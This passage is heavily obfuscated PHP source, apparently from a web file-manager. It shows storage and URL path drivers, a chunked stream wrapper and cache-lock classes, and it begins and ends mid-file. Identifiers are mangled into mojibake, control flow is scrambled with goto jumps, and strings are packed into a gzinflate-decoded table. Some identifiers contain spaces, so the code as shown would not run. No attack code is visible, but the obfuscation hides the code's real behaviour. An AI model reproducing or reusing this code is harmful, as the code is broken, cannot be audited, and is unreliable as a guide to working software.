$c…˘øãıëŒ, $EËªÇÖı™Ù); } public function fileOutImage($f≈ÿàÑèß‘, $bß‚õäƒää = 250) { $B†ﬂ’◊˜ÙÒ = $this->link($f≈ÿàÑèß‘ . $_SERVER[™⁄»üÆ][1377] . $bß‚õäƒää); $this->fileOutLink($B†ﬂ’◊˜ÙÒ); } public function fileOutImageServer($A„Ç◊ãÏ›±, $b§Ù¡âªµ£ = 250) { parent::fileOutImage($A„Ç◊ãÏ›±, $b§Ù¡âªµ£); } public function hashMd5($Dﬁ÷ÇçŒ®ò) { $dâ≠Ûª∂≥… =& $_SERVER[™⁄»üÆ]; $FæàÜÑÕı≈ = $this->_objectMeta($Dﬁ÷ÇçŒ®ò); return isset($FæàÜÑÕı≈[$dâ≠Ûª∂≥…[208]]) ? $FæàÜÑÕı≈[$dâ≠Ûª∂≥…[208]] : !1; } public function size($d˘Ï±Ôà›Ñ) { $Cì±—ÆòÖÆ = $this->objectMeta($d˘Ï±Ôà›Ñ); return $Cì±—ÆòÖÆ ? $Cì±—ÆòÖÆ[$_SERVER[™⁄»üÆ][78]] : 0; } public function info($DìÇ„∂≠⁄⁄) { if ($this->isFolder($DìÇ„∂≠⁄⁄)) { return $this->folderInfo($DìÇ„∂≠⁄⁄); } else { if ($this->isFile($DìÇ„∂≠⁄⁄)) { return $this->fileInfo($DìÇ„∂≠⁄⁄); } } return !1; } public function exist($d≈ëÙÎÜπì) { return $this->isFile($d≈ëÙÎÜπì) || $this->isFolder($d≈ëÙÎÜπì); } public function isFile($c§€‹û›´À) { return !$this->isFolder($c§€‹û›´À) && $this->objectMeta($c§€‹û›´À); } public function isFolder($Aıâ“ûÜÜø) { return $this->cacheMethod($_SERVER[™⁄»üÆ][199], $Aıâ“ûÜÜø); } protected function objectMeta($fŸ†–õ‹Ç) { return $this->cacheMethod($_SERVER[™⁄»üÆ][200], $fŸ†–õ‹Ç); } protected function _objectMeta($aΩÏ¢€ŸÇÜ) { goto DÀºóùπ ; aÍüµËÌ≤≤: $fÉ†∑èÃ√Á = array($fÊæçõ‘≤ò[29] => isset($e∆©ìΩŒä[$fÊæçõ‘≤ò[1379]]) ? $e∆©ìΩŒä[$fÊæçõ‘≤ò[1379]] : null, $fÊæçõ‘≤ò[78] => isset($e∆©ìΩŒä[$fÊæçõ‘≤ò[1380]]) ? $e∆©ìΩŒä[$fÊæçõ‘≤ò[1380]] : null, $fÊæçõ‘≤ò[208] => isset($e∆©ìΩŒä[$fÊæçõ‘≤ò[1381]]) ? $e∆©ìΩŒä[$fÊæçõ‘≤ò[1381]] : null, $fÊæçõ‘≤ò[1348] => isset($e∆©ìΩŒä[$fÊæçõ‘≤ò[1382]]) ? $e∆©ìΩŒä[$fÊæçõ‘≤ò[1382]] : null); $fÉ†∑èÃ√Á[$fÊæçõ‘≤ò[1349]] = isset($e∆©ìΩŒä[$fÊæçõ‘≤ò[1383]]) ? strtotime($e∆©ìΩŒä[$fÊæçõ‘≤ò[1383]]) : $fÉ†∑èÃ√Á[$fÊæçõ‘≤ò[1348]]; return $fÉ†∑èÃ√Á; goto Aà´”™«Ù©; DÀºóùπ : $fÊæçõ‘≤ò =& $_SERVER[™⁄»üÆ]; if ($aΩÏ¢€ŸÇÜ == $fÊæçõ‘≤ò[33] || $aΩÏ¢€ŸÇÜ == $fÊæçõ‘≤ò[8]) { return array(); } $e⁄ì… Úºÿ = $this->ussRequest($aΩÏ¢€ŸÇÜ, $fÊæçõ‘≤ò[1378]); goto b¥≠çÜÌœˆ; b¥≠çÜÌœˆ: if (!$e⁄ì… Úºÿ[$fÊæçõ‘≤ò[1094]]) { return null; } $e∆©ìΩŒä = isset($e⁄ì… Úºÿ[$fÊæçõ‘≤ò[1096]]) ? $e⁄ì… Úºÿ[$fÊæçõ‘≤ò[1096]] : array(); if (!isset($e∆©ìΩŒä[$fÊæçõ‘≤ò[1379]])) { return null; } goto aÍüµËÌ≤≤; Aà´”™«Ù©: } protected function _isFolder($D∑»Ñê—¯ÿ) { $e‘⁄“Ö≈™ñ =& $_SERVER[™⁄»üÆ]; if ($D∑»Ñê—¯ÿ == $e‘⁄“Ö≈™ñ[33] || $D∑»Ñê—¯ÿ == $e‘⁄“Ö≈™ñ[8]) { return !0; } $f›£Œ˜÷’» = $this->_objectMeta($D∑»Ñê—¯ÿ); return isset($f›£Œ˜÷’»[$e‘⁄“Ö≈™ñ[29]]) && $f›£Œ˜÷’»[$e‘⁄“Ö≈™ñ[29]] == $e‘⁄“Ö≈™ñ[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($DÙ®Ïã‘ŸÇ = false) { } public function exist($e√ãÉÕ™êù) { $e——âﬁâÇÙ = $this->info($e√ãÉÕ™êù); return $e——âﬁâÇÙ[$_SERVER[™⁄»üÆ][195]]; } public function isFile($DãıË ˆôê) { $BõŒ÷ôØÌ‚ = $this->info($DãıË ˆôê); return $BõŒ÷ôØÌ‚[$_SERVER[™⁄»üÆ][195]]; } public function isFolder($F“çŒÊ∂π–) { return !1; } public function size($B∞Ö€‚Œªë) { $A¯∞à¯ò¯π = $this->info($B∞Ö€‚Œªë); return $A¯∞à¯ò¯π[$_SERVER[™⁄»üÆ][78]]; } public function info($fí«ŸÒÜ≥) { return $this->infoParse($fí«ŸÒÜ≥); } public function infoAuth($CäÊ˜ô¢À√) { return $this->infoParse($CäÊ˜ô¢À√); } public function infoWithChildren($b«∫ı¿±”‡) { return $this->infoParse($b«∫ı¿±”‡); } public function infoFull($c¥ªÙ™é“∞) { return $this->infoParse($c¥ªÙ™é“∞); } private function infoParse($EÏ∑Ÿ°°¯Ã) { $A‹ÒçœÑÛÒ =& $_SERVER[™⁄»üÆ]; $DÑÇ¨≥ÆèØ = $this->header($EÏ∑Ÿ°°¯Ã); if (!$DÑÇ¨≥ÆèØ || !$DÑÇ¨≥ÆèØ[$A‹ÒçœÑÛÒ[729]]) { return !1; } $dø‚Ù«Ã•ù = _get($DÑÇ¨≥ÆèØ, $A‹ÒçœÑÛÒ[335], 0); $aåÛ√º©ò´ = array($A‹ÒçœÑÛÒ[28] => $DÑÇ¨≥ÆèØ[$A‹ÒçœÑÛÒ[28]], $A‹ÒçœÑÛÒ[76] => $EÏ∑Ÿ°°¯Ã, $A‹ÒçœÑÛÒ[29] => $A‹ÒçœÑÛÒ[193], $A‹ÒçœÑÛÒ[78] => intval($dø‚Ù«Ã•ù), $A‹ÒçœÑÛÒ[168] => get_path_ext($DÑÇ¨≥ÆèØ[$A‹ÒçœÑÛÒ[28]]), $A‹ÒçœÑÛÒ[1264] => $dø‚Ù«Ã•ù > 0 && $DÑÇ¨≥ÆèØ[$A‹ÒçœÑÛÒ[1384]], $A‹ÒçœÑÛÒ[1265] => !1); return $aåÛ√º©ò´; } private function header($dºÖá∫íè”) { goto d‡‘ï‡≠íŸ; eÛ¬¢„ﬁãê: $GLOBALS[$AÏß·õêäç[1385]] = !0; self::$_cacheHeader[$dºÖá∫íè”] = url_header($dºÖá∫íè”); $GLOBALS[$AÏß·õêäç[1385]] = $A•ıÉø∞ŸÇ; goto BÑ∑“èæÔ†; d‡‘ï‡≠íŸ: $AÏß·õêäç =& $_SERVER[™⁄»üÆ]; if (isset(self::$_cacheHeader[$dºÖá∫íè”])) { return self::$_cacheHeader[$dºÖá∫íè”]; } $A•ıÉø∞ŸÇ = isset($GLOBALS[$AÏß·õêäç[1385]]) ? $GLOBALS[$AÏß·õêäç[1385]] : !1; goto eÛ¬¢„ﬁãê; BÑ∑“èæÔ†: return self::$_cacheHeader[$dºÖá∫íè”]; goto dŸÛ«¯∞∞›; dŸÛ«¯∞∞›: } public function hashSimple($EÖâÕùŸÿ, $C…≈‰ëéüÒ = false) { goto fΩﬂ®›íΩØ; fΩﬂ®›íΩØ: $bŒ‘ìƒèÀ∆ =& $_SERVER[™⁄»üÆ]; $b∆œË‹·û∂ = $this->info($EÖâÕùŸÿ); if (!$b∆œË‹·û∂ || !$b∆œË‹·û∂[$bŒ‘ìƒèÀ∆[195]]) { return !1; } goto Båáäƒ≥≥‘; CÿÍëãéÁÔ: $E∫‹ÓáöÆ∞ = timeFloat(); $c˜–ÉËƒÂÆ = 15; for ($FΩÖØ‡Ω©Ë = 0; $FΩÖØ‡Ω©Ë < $Bóù®Â¶¡Æ; $FΩÖØ‡Ω©Ë++) { if (timeFloat() - $E∫‹ÓáöÆ∞ > $c˜–ÉËƒÂÆ) { return !1; } $CÖ¥≈∑±ˆÜ = $this->fileSubstr($EÖâÕùŸÿ, $eΩü‰ÍééÏ * $FΩÖØ‡Ω©Ë, $Fºàªøéâ¿); if (!$CÖ¥≈∑±ˆÜ) { return !1; } $FËáÂõçÖâ .= $CÖ¥≈∑±ˆÜ; } goto D¿¬âè˘±ù; D¿¬âè˘±ù: $FËáÂõçÖâ .= $this->fileSubstr($EÖâÕùŸÿ, $cßí⁄ŸØé - $Fºàªøéâ¿, $Fºàªøéâ¿); return md5($FËáÂõçÖâ) . $cßí⁄ŸØé; goto Aè∑›¬π∏‰; Båáäƒ≥≥‘: $cßí⁄ŸØé = $b∆œË‹·û∂[$bŒ‘ìƒèÀ∆[78]]; $Fºàªøéâ¿ = 200; $Bóù®Â¶¡Æ = 50; goto b∂åÊÁïãÇ; b∂åÊÁïãÇ: if ($cßí⁄ŸØé <= $Fºàªøéâ¿ * $Bóù®Â¶¡Æ) { return md5($this->fileSubstr($EÖâÕùŸÿ, 0, $cßí⁄ŸØé)) . $cßí⁄ŸØé; } $eΩü‰ÍééÏ = intval($cßí⁄ŸØé / $Bóù®Â¶¡Æ); $FËáÂõçÖâ = $bŒ‘ìƒèÀ∆[33]; goto CÿÍëãéÁÔ; Aè∑›¬π∏‰: } public function getContent($AÜã≤Ñã•û) { return $this->fileSubstr($AÜã≤Ñã•û); } public function fileSubstr($f∞¯•òƒ¨ª, $f€èöÔ¯¨§ = 0, $dıìÓ¬ò˘ƒ = -1) { goto fﬂñúê·¬∫; fﬂñúê·¬∫: $Eà ŸÜ·≥« =& $_SERVER[™⁄»üÆ]; $AíåÃêµ€ﬂ = $this->info($f∞¯•òƒ¨ª); if (!$AíåÃêµ€ﬂ || !$AíåÃêµ€ﬂ[$Eà ŸÜ·≥«[195]] && $AíåÃêµ€ﬂ[$Eà ŸÜ·≥«[78]] > 1024 * 1024 * 10) { return !1; } goto dâû¯ÏÁ’Û; dâû¯ÏÁ’Û: if ($dıìÓ¬ò˘ƒ === -1) { $dıìÓ¬ò˘ƒ = $AíåÃêµ€ﬂ[$Eà ŸÜ·≥«[78]]; } if ($dıìÓ¬ò˘ƒ == 0) { return $Eà ŸÜ·≥«[33]; } $Cò≠Áèªˆû = array($Eà ŸÜ·≥«[1386] . $f€èöÔ¯¨§ . $Eà ŸÜ·≥«[763] . ($f€èöÔ¯¨§ + $dıìÓ¬ò˘ƒ - 1)); goto EÁ–…õÉıŒ; EÁ–…õÉıŒ: $F¬äÈÇîÏë = url_request($f∞¯•òƒ¨ª, $Eà ŸÜ·≥«[228], !1, $Cò≠Áèªˆû, !1, !1, 1); return $F¬äÈÇîÏë[$Eà ŸÜ·≥«[1096]] ? $F¬äÈÇîÏë[$Eà ŸÜ·≥«[1096]] : $Eà ŸÜ·≥«[33]; goto bÇπ·Éå†÷; bÇπ·Éå†÷: } public function download($bßÑÎ˜ûËÌ, $f∞æ£∆ƒˆ¯) { Downloader::start($bßÑÎ˜ûËÌ, $f∞æ£∆ƒˆ¯); return $f∞æ£∆ƒˆ¯; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($F‘ºá∆Í‹î, $eÜ…ò¢≤Ç£ = '') { goto C¢ç‚ÿ„õ‰; FÕ›≥ı¡Ûã: $this->pathOpen = $F‘ºá∆Í‹î; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto E’…üàÏ∆é; C¢ç‚ÿ„õ‰: $this->info = $this->info($F‘ºá∆Í‹î); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[™⁄»üÆ][76]]; goto FÕ›≥ı¡Ûã; E’…üàÏ∆é: if (!isset(self::$_chunkBuffer[$F‘ºá∆Í‹î])) { self::$_chunkBuffer[$F‘ºá∆Í‹î] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto a∆âõ„π™Œ; a∆âõ„π™Œ: } function stream_read($cÚ«¨å’òÖ) { $DÖÔÿ≤ëáÇ = $this->fileSubstr($this->pose, $cÚ«¨å’òÖ); $this->pose += strlen($DÖÔÿ≤ëáÇ); return $DÖÔÿ≤ëáÇ; } public function stream_tell() { return $this->pose; } public function stream_seek($b¯øÖå≈√‹, $dÍÒÌøﬁ†ó) { $dÖ∏•Á›ÍØ =& $_SERVER[™⁄»üÆ]; if ($dÍÒÌøﬁ†ó == SEEK_SET) { $this->pose = $b¯øÖå≈√‹; } else { if ($dÍÒÌøﬁ†ó == SEEK_CUR) { $this->pose += $b¯øÖå≈√‹; } else { if ($dÍÒÌøﬁ†ó == SEEK_END) { $this->pose = $this->info[$dÖ∏•Á›ÍØ[78]] + intval($b¯øÖå≈√‹); } } } if ($b¯øÖå≈√‹ < 0) { $this->pose = $this->info[$dÖ∏•Á›ÍØ[78]] + $b¯øÖå≈√‹; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[™⁄»üÆ][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($a€Û∂‰Œ˜«, $AÜÔ§°Ì∆Œ) { $f‹íû∫êﬂ’ =& $_SERVER[™⁄»üÆ]; $Eı›ûäıÂÜ = $this->info($a€Û∂‰Œ˜«); return array($f‹íû∫êﬂ’[1387] => 0, $f‹íû∫êﬂ’[1388] => 0, $f‹íû∫êﬂ’[12] => 32768 + 511, $f‹íû∫êﬂ’[1389] => 0, $f‹íû∫êﬂ’[1390] => 0, $f‹íû∫êﬂ’[1391] => 0, $f‹íû∫êﬂ’[1392] => 0, $f‹íû∫êﬂ’[78] => $Eı›ûäıÂÜ[$f‹íû∫êﬂ’[78]], $f‹íû∫êﬂ’[1393] => $Eı›ûäıÂÜ[$f‹íû∫êﬂ’[1263]], $f‹íû∫êﬂ’[1349] => $Eı›ûäıÂÜ[$f‹íû∫êﬂ’[84]], $f‹íû∫êﬂ’[1348] => $Eı›ûäıÂÜ[$f‹íû∫êﬂ’[194]], $f‹íû∫êﬂ’[1394] => 0, $f‹íû∫êﬂ’[1395] => 0); } static $fileInfo = array(); public function info($f¨”ßè äÑ) { $Aœ≤—ﬂ€º⁄ = $_SERVER[™⁄»üÆ][1396]; if (isset(self::$fileInfo[$f¨”ßè äÑ])) { return self::$fileInfo[$f¨”ßè äÑ]; } if (substr($f¨”ßè äÑ, 0, strlen($Aœ≤—ﬂ€º⁄)) != $Aœ≤—ﬂ€º⁄) { return !1; } self::$fileInfo[$f¨”ßè äÑ] = IO::info(substr($f¨”ßè äÑ, strlen($Aœ≤—ﬂ€º⁄))); return self::$fileInfo[$f¨”ßè äÑ]; } public static function read($E≠∆≠ñå∑∞, $D§©⁄¬ãÉÓ, $a›·Ï’∏Éı) { if (!isset(self::$_fopenCache[$E≠∆≠ñå∑∞])) { $Fáßœã©á€ = new StreamWrapperIO(); $Fáßœã©á€->stream_open($E≠∆≠ñå∑∞); self::$_fopenCache[$E≠∆≠ñå∑∞] = $Fáßœã©á€; } $Fáßœã©á€ = self::$_fopenCache[$E≠∆≠ñå∑∞]; return $Fáßœã©á€->fileSubstr($D§©⁄¬ãÉÓ, $a›·Ï’∏Éı); } public static function _read($D’˘≠ùâÇÈ, $AÌ ÈÁ•…ç, $e∑Æøáë´ñ) { goto d¶î‚Ô·ëŒ; FˆâßŒåÍæ: $bñ≥âçﬁêà = 8192; fseek($AéŒƒûÜ…√, $AÌ ÈÁ•…ç, SEEK_SET); $e≤òåù«• = $aêë◊ªïáå[33]; goto AùÌø—êûà; AùÌø—êûà: $FªΩÖè∞òø = 0; while ($FªΩÖè∞òø < $e∑Æøáë´ñ) { $aπ¬™ëçÎá = min($bñ≥âçﬁêà, $e∑Æøáë´ñ - $FªΩÖè∞òø); $e≤òåù«• .= fread($AéŒƒûÜ…√, $aπ¬™ëçÎá); $FªΩÖè∞òø += $aπ¬™ëçÎá; } fclose($AéŒƒûÜ…√); goto b≥πÃÉ¢ò; d¶î‚Ô·ëŒ: $aêë◊ªïáå =& $_SERVER[™⁄»üÆ]; $AéŒƒûÜ…√ = fopen($D’˘≠ùâÇÈ, $aêë◊ªïáå[1267]); if (!$AéŒƒûÜ…√) { return $aêë◊ªïáå[33]; } goto FˆâßŒåÍæ; b≥πÃÉ¢ò: return $e≤òåù«•; goto aÔÒ•Øè∞•; aÔÒ•Øè∞•: } public function fileSubstr($e‚î∏†æÔô, $A¶îÂŒ—ÇÛ) { goto c¥µäüÕÚ¡; aÎØ‹çùî: $EäôãÍÉãâ = 64 * 1024; $FáÓ√∏˜Ã… =& self::$_chunkBuffer[$this->path]; if (!$FáÓ√∏˜Ã…) { $FáÓ√∏˜Ã… = array(); } goto Aˆ‹÷ı≈Ú„; dò∑œ⁄ÑÍÑ: ksort($FáÓ√∏˜Ã…); $EÕ’èòÂƒ– = substr($b’⁄ŒëÁ∂∫, $e‚î∏†æÔô - $FŒé¡ä¯Ù±, $A¶îÂŒ—ÇÛ); return $EÕ’èòÂƒ–; goto b–Õ–Ú£ûø; B¶‚èÏùó◊: if ($e‚î∏†æÔô + $A¶îÂŒ—ÇÛ > $EØ”Éû÷èÚ) { $A¶îÂŒ—ÇÛ = $EØ”Éû÷èÚ - $e‚î∏†æÔô; } if ($A¶îÂŒ—ÇÛ <= 0) { return $Dõ∑üãïòâ[33]; } if ($e‚î∏†æÔô < 0 || $e‚î∏†æÔô >= $EØ”Éû÷èÚ || $A¶îÂŒ—ÇÛ <= 0 || $A¶îÂŒ—ÇÛ > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\x69\154\145\x52\145\141\144\40\x65\x72\x72\x6f\x72\41\x20\163\164\x61\162\164\x3d{$e‚î∏†æÔô}\73\154\x65\x6e\x67\x74\x68\x3d{$A¶îÂŒ—ÇÛ}\x3b\40\x73\x69\x7a\x65\x3d{$EØ”Éû÷èÚ}\x3b"); } goto aÎØ‹çùî; c¥µäüÕÚ¡: $Dõ∑üãïòâ =& $_SERVER[™⁄»üÆ]; $EØ”Éû÷èÚ = $this->info[$Dõ∑üãïòâ[78]]; $D›æµ∫ÉéØ = $e‚î∏†æÔô; goto cÕ≠Ò¥‰™Õ; d˘ëéÿœÃé: $f‹ÔÁåß¯´ = ceil(($e‚î∏†æÔô + $A¶îÂŒ—ÇÛ) / $EäôãÍÉãâ) * $EäôãÍÉãâ - $FŒé¡ä¯Ù±; $b’⁄ŒëÁ∂∫ = IO::fileSubstr($this->path, $FŒé¡ä¯Ù±, $f‹ÔÁåß¯´); $FáÓ√∏˜Ã…[$FŒé¡ä¯Ù± . $Dõ∑üãïòâ[33]] = $b’⁄ŒëÁ∂∫; goto dò∑œ⁄ÑÍÑ; Aâ¯ÏÂµûÊ: foreach ($FáÓ√∏˜Ã… as $a’õÏÁÒ±ñ => $e®¥É…∆ê˘) { $a’õÏÁÒ±ñ = intval($a’õÏÁÒ±ñ); $Eœ≈Ã‘ú”Õ = $a’õÏÁÒ±ñ + strlen($e®¥É…∆ê˘); if ($e‚î∏†æÔô >= $Eœ≈Ã‘ú”Õ) { continue; } if ($e‚î∏†æÔô >= $a’õÏÁÒ±ñ && $e‚î∏†æÔô + $A¶îÂŒ—ÇÛ <= $Eœ≈Ã‘ú”Õ) { return substr($e®¥É…∆ê˘, $e‚î∏†æÔô - $a’õÏÁÒ±ñ, $A¶îÂŒ—ÇÛ); } break; } if (count($FáÓ√∏˜Ã…) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Dõ∑üãïòâ[1397], $Dõ∑üãïòâ[1398] . count($FáÓ√∏˜Ã…) . "\x3b\163\164\x61\x72\x74\x3d{$e‚î∏†æÔô}\x2c\x6c\x65\156\147\164\x68\75{$A¶îÂŒ—ÇÛ}\73\x70\x6f\163\145\72{$a’õÏÁÒ±ñ}\x7e{$Eœ≈Ã‘ú”Õ}"); throw new Exception($Dõ∑üãïòâ[1399]); } $FŒé¡ä¯Ù± = intval($e‚î∏†æÔô / $EäôãÍÉãâ) * $EäôãÍÉãâ; goto d˘ëéÿœÃé; Aˆ‹÷ı≈Ú„: $a’õÏÁÒ±ñ = 0; $Eœ≈Ã‘ú”Õ = 0; $e®¥É…∆ê˘ = $Dõ∑üãïòâ[33]; goto Aâ¯ÏÂµûÊ; cÕ≠Ò¥‰™Õ: $eÓ¿éıΩ°≠ = $A¶îÂŒ—ÇÛ; if ($e‚î∏†æÔô < 0) { $e‚î∏†æÔô = $EØ”Éû÷èÚ + $e‚î∏†æÔô; } if ($A¶îÂŒ—ÇÛ === !1) { $A¶îÂŒ—ÇÛ = $EØ”Éû÷èÚ - $e‚î∏†æÔô; } goto B¶‚èÏùó◊; b–Õ–Ú£ûø: } private function log($dÓ”•„ÏØ´, $F“äÉÜ≈ÊÆ) { $dø˜à”Ê´ó =& $_SERVER[™⁄»üÆ]; $eŸπ≠ı∆¨« = timeFloat() - $this->timeStart; write_log(sprintf($dø˜à”Ê´ó[1400], $dÓ”•„ÏØ´, $this->info[$dø˜à”Ê´ó[28]], $eŸπ≠ı∆¨«, $F“äÉÜ≈ÊÆ), $dø˜à”Ê´ó[1086]); } } goto DìÌ—óúë§; b§ºÃ≥Û’è: $BåÔçöúò° = $_SERVER[™⁄»üÆ][588]; $_SERVER[åì®®Íêß] = explode($_SERVER[™⁄»üÆ][589], gzinflate(substr($_SERVER[™⁄»üÆ][590], 10, -8))); $bµ„„´Ωûá = $_SERVER[™⁄»üÆ][591]; goto a»ºèΩ“ËÂ; b…ﬁ⁄øã¢ä: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto bîµïûÇéÇ; D„∆à≥±è: self::$timeout = $eÚª¥π§¶ñ[$aÀπ∑•∫•Ñ[825]] ? $eÚª¥π§¶ñ[$aÀπ∑•∫•Ñ[825]] : 10; $eßÇöœàƒˆ = _get($GLOBALS[$aÀπ∑•∫•Ñ[6]], $aÀπ∑•∫•Ñ[826]); $B≈Á•º‹…Ç = $eÚª¥π§¶ñ[$aÀπ∑•∫•Ñ[811]] ? $eÚª¥π§¶ñ[$aÀπ∑•∫•Ñ[811]] : $aÀπ∑•∫•Ñ[193]; goto cêÜ†ÌŸ±ˆ; cêÜ†ÌŸ±ˆ: if ($B≈Á•º‹…Ç == $aÀπ∑•∫•Ñ[17] && $eßÇöœàƒˆ == $aÀπ∑•∫•Ñ[9]) { $B≈Á•º‹…Ç = $aÀπ∑•∫•Ñ[193]; } switch ($B≈Á•º‹…Ç) { case $aÀπ∑•∫•Ñ[814]: self::$handle = new CacheLockRedis(); break; case $aÀπ∑•∫•Ñ[815]: self::$handle = new CacheLockMemcached(); break; case $aÀπ∑•∫•Ñ[17]: self::$handle = new CacheLockDatabase(); break; case $aÀπ∑•∫•Ñ[193]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto fªÜ•ﬂÖ∑; bîµïûÇéÇ: $aÀπ∑•∫•Ñ =& $_SERVER[™⁄»üÆ]; if (self::$handle) { return self::$handle; } $eÚª¥π§¶ñ = $GLOBALS[$aÀπ∑•∫•Ñ[6]][$aÀπ∑•∫•Ñ[347]]; goto D„∆à≥±è; fªÜ•ﬂÖ∑: } private static function key($F„ÿ√ÌﬁÿÉ) { return $_SERVER[™⁄»üÆ][827] . Cache::key($F„ÿ√ÌﬁÿÉ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($DëÇ˘®â—∫ = '') { self::$errorMsg = $DëÇ˘®â—∫; } public static function lockGlobal($CÚâ≈ê…¨é, $CâÚÏÊ¿‰¨) { return self::lock($CÚâ≈ê…¨é, $CâÚÏÊ¿‰¨, !0); } public static function lock($bñ«äﬂÇúÜ, $dÌ‡‰‡úΩç = false, $A∫ù⁄µÜÔÿ = false) { goto f£¡¯íÜ∏π; A≈Ôô‹«Ò§: $dÌ‡‰‡úΩç = $dÌ‡‰‡úΩç ? $dÌ‡‰‡úΩç : self::$timeout; $céÔÈ‚äÇö = $F∆±óΩ√Ìˆ->lock($c´àü‡Êñ∑, $dÌ‡‰‡úΩç); if (!$céÔÈ‚äÇö) { $E±ÑáÜ¿Œí = "\154\x6f\x63\153\x20\145\162\162\x6f\162\73\x6b\145\171\75{$bñ«äﬂÇúÜ}\73\164\151\155\x65\x3d{$dÌ‡‰‡úΩç}\x3b" . self::$errorMsg . $dÃÒº∑∞ö≈[68] . get_caller_msg(); $A√¬•ﬁç◊ê = LNG($dÃÒº∑∞ö≈[828]) . "\50{$dÌ‡‰‡úΩç}\163\x29\56" . LNG($dÃÒº∑∞ö≈[829]); $A√¬•ﬁç◊ê .= $dÃÒº∑∞ö≈[830]; if (is_string(self::$errorMsg) && self::$errorMsg) { $A√¬•ﬁç◊ê = $A√¬•ﬁç◊ê . $dÃÒº∑∞ö≈[831] . self::$errorMsg; } write_log($E±ÑáÜ¿Œí, $dÃÒº∑∞ö≈[832]); show_json($A√¬•ﬁç◊ê, !1); } goto fÜ¢ø±Ïö»; f£¡¯íÜ∏π: $dÃÒº∑∞ö≈ =& $_SERVER[™⁄»üÆ]; $F∆±óΩ√Ìˆ = self::init(); $c´àü‡Êñ∑ = self::key($bñ«äﬂÇúÜ); goto A≈Ôô‹«Ò§; fÜ¢ø±Ïö»: if (!$A∫ù⁄µÜÔÿ) { self::$lockItem[$c´àü‡Êñ∑] = !0; } return $céÔÈ‚äÇö; goto C§ÇÜÉØ‹Æ; C§ÇÜÉØ‹Æ: } public static function lockGet($cº’ñÚü®ú) { $cßÙ‚⁄£àº = self::key($cº’ñÚü®ú); if (self::$lockItem[$cßÙ‚⁄£àº]) { return self::$lockItem[$cßÙ‚⁄£àº]; } return self::init()->lockGet($cßÙ‚⁄£àº); } public static function unlock($eÇıéËŸ€£) { $bîºÌ†≥áΩ = self::key($eÇıéËŸ€£); self::$lockItem[$bîºÌ†≥áΩ] = null; return self::init()->unlock($bîºÌ†≥áΩ); } public static function unlockRuntime() { $a»õµ¯©ıò =& $_SERVER[™⁄»üÆ]; $e…Ìô‹ÎÏï = self::init(); $eÓ≠˘î¿Ö∞ = !1; foreach (self::$lockItem as $DŸ—œÌÖ¶¶ => $E ’’Òá¨‚) { if (!$E ’’Òá¨‚) { continue; } $e…Ìô‹ÎÏï->unlock($DŸ—œÌÖ¶¶); if (!$eÓ≠˘î¿Ö∞) { $eÓ≠˘î¿Ö∞ = !0; write_log($a»õµ¯©ıò[833] . $DŸ—œÌÖ¶¶ . $a»õµ¯©ıò[68] . get_caller_msg(), $a»õµ¯©ıò[832]); continue; } write_log($a»õµ¯©ıò[833] . $DŸ—œÌÖ¶¶, $a»õµ¯©ıò[832]); } self::fileUnlockAll(); } public static function fileLock($CÆ’û§ê¨ë) { goto D®Ë∞ÑÂ›Î; D®Ë∞ÑÂ›Î: $e±¥ÍÖ§Ü¨ =& $_SERVER[™⁄»üÆ]; if (!$GLOBALS[$e±¥ÍÖ§Ü¨[834]]) { $GLOBALS[$e±¥ÍÖ§Ü¨[834]] = array(); } $GLOBALS[$e±¥ÍÖ§Ü¨[834]][$CÆ’û§ê¨ë] = !1; goto a∂∂ôåìµô; a∂∂ôåìµô: $AªèìûÕ„‚ = fopen(DATA_PATH . $CÆ’û§ê¨ë . $e±¥ÍÖ§Ü¨[835], $e±¥ÍÖ§Ü¨[836]); if (!$AªèìûÕ„‚) { return !1; } $GLOBALS[$e±¥ÍÖ§Ü¨[834]][$CÆ’û§ê¨ë] = $AªèìûÕ„‚; goto B¿’É∆è€´; fîØﬂ‚”åÎ: return !1; goto F≥ŸäÏ™œÉ; B¿’É∆è€´: if (flock($AªèìûÕ„‚, LOCK_EX)) { return !0; } self::unlock($CÆ’û§ê¨ë); show_json($e±¥ÍÖ§Ü¨[837], !1); goto fîØﬂ‚”åÎ; F≥ŸäÏ™œÉ: } public static function fileUnlock($E≤∏›Î÷î≤) { $aã±Ÿ‚›Ìö =& $_SERVER[™⁄»üÆ]; $cïä÷ê‹ùâ = $GLOBALS[$aã±Ÿ‚›Ìö[834]][$E≤∏›Î÷î≤]; if (!$cïä÷ê‹ùâ) { return; } $GLOBALS[$aã±Ÿ‚›Ìö[834]][$E≤∏›Î÷î≤] = !1; flock($cïä÷ê‹ùâ, LOCK_UN); fclose($cïä÷ê‹ùâ); } public static function fileUnlockAll() { $Dï–∆Ñ©ã˜ =& $_SERVER[™⁄»üÆ]; if (!$GLOBALS[$Dï–∆Ñ©ã˜[834]]) { return; } foreach ($GLOBALS[$Dï–∆Ñ©ã˜[834]] as $e‚ÙÉíå„õ => $eçåçæ€ﬁû) { if (!$eçåçæ€ﬁû) { continue; } $GLOBALS[$Dï–∆Ñ©ã˜[834]][$e‚ÙÉíå„õ] = !1; flock($eçåçæ€ﬁû, LOCK_UN); fclose($eçåçæ€ﬁû); } $GLOBALS[$Dï–∆Ñ©ã˜[834]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $B∞ØäÕ∆®Â =& $_SERVER[™⁄»üÆ]; $e¿‡Üˆõ±ô = $GLOBALS[$B∞ØäÕ∆®Â[6]][$B∞ØäÕ∆®Â[347]]; self::$cachePath = 